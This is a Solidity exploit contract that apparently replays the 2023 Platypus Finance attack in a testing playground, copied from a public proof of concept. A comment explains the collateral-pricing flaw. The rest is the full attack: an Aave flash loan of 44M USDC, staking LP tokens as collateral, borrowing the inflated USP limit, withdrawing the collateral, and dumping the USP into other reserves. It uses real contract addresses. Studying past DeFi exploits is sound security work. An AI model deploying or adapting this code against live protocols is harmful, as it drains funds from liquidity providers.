// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-Platypus).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this), and the Aave flash-loan callback
// `executeOperation` lives on the test itself, so there is no standalone
// attack contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit -> run, executeOperation,
// swapUSPToOtherToken) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/Platypus_exp.sol.
//
// Root cause: PlatypusTreasure prices LP collateral (_getLPUnitPrice) off the
// pool's `liability` (the *promised* book obligation to LPs) instead of its
// `cash` (what Pool.withdraw actually pays out). borrow() only checks that
// debt stays under the resulting (inflated) borrow limit at call time, and
// imposes no lock forcing the borrower to keep the LP staked afterwards.
// The attacker flash-borrows 44M USDC, deposits it into the Pool for
// LPUSDC, stakes it in MasterPlatypus as Treasure collateral, borrows the
// full (inflated) USP limit against it, then immediately unstakes +
// withdraws the LP back to USDC (repaying the flash loan) -- leaving
// Treasure with an unbacked USP debt. The borrowed USP is partly dumped
// into the Pool's other stable reserves, draining ~$8.5M of honest
// liquidity and depegging USP.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface PlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external;
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external;
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface MasterPlatypusV4 {
    function deposit(uint256 _pid, uint256 _amount) external;
    function emergencyWithdraw(uint256 _pid) external;
}

interface PlatypusTreasure {
    struct PositionView {
        uint256 collateralAmount;
        uint256 collateralUSD;
        uint256 borrowLimitUSP;
        uint256 liquidateLimitUSP;
        uint256 debtAmountUSP;
        uint256 debtShare;
        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
        bool liquidable;
    }

    function positionView(address _user, address _token) external view returns (PositionView memory);
    function borrow(address _token, uint256 _borrowAmount) external;
}

contract PlatypusDrain {
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 constant USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);
    IERC20 constant USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 constant USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    IERC20 constant USDT_E = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 constant BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    IERC20 constant DAI_E = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 constant LPUSDC = IERC20(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    PlatypusPool constant Pool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    MasterPlatypusV4 constant Master = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure constant Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
    IAaveFlashloanSimple constant aaveV3 = IAaveFlashloanSimple(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    // step 0: flash-borrow 44,000,000 USDC from Aave v3; the callback does the rest.
    function run() external {
        aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        // step 1: deposit the flash-loaned USDC into the Pool for LP-USDC.
        USDC.approve(address(aaveV3), amount + premium);
        USDC.approve(address(Pool), amount);
        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));

        // step 2: stake the LP-USDC in MasterPlatypus (pid 4) as Treasure collateral.
        LPUSDC.approve(address(Master), LPUSDCAmount);
        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus

        // step 3: read the (inflated) borrow limit and borrow the full amount of USP.
        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
        uint256 borrowAmount = Position.borrowLimitUSP;
        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure

        // step 4: unstake + withdraw the LP back to USDC, leaving the USP debt unbacked.
        Master.emergencyWithdraw(4);
        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC

        // step 5: dump part of the borrowed USP into the pool's other reserves.
        swapUSPToOtherToken();
        return true;
    }

    function swapUSPToOtherToken() internal {
        USP.approve(address(Pool), 9_000_000 * 1e18);
        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
    }
}
